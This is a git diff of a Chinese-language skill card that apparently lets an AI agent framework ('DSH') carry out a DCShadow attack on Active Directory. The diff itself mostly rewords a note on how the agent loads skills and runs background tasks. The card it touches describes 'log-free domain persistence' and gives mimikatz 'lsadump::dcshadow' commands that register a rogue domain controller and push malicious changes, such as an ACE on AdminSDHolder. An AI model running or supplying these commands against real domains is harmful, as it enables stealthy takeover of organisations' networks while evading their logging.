@@ -4,7 +4,7 @@ description: 'DCShadow：注册rogue DC→通过DRSUAPI推送恶意AD变更→�
 disable-model-invocation: true
 metadata: { domain: ad-win, tier: T2 }
 ---
-> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
+> 📌 DSH 用法：按卡名用 skill 工具加载；长任务用 bash 后台任务、并行侦察用 subagent。
 
 ## DCShadow — 无日志域持久化
 
@@ -18,7 +18,7 @@ mimikatz.exe "lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=domain,DC=
 
 # 2. 在另一会话中触发复制（或等待自动复制）
 mimikatz.exe "lsadump::dcshadow /push" "exit"
-```
+```text
 
 ### 常见用法
 - 给 AdminSDHolder 添加 ACE → 60 分钟后全局传播
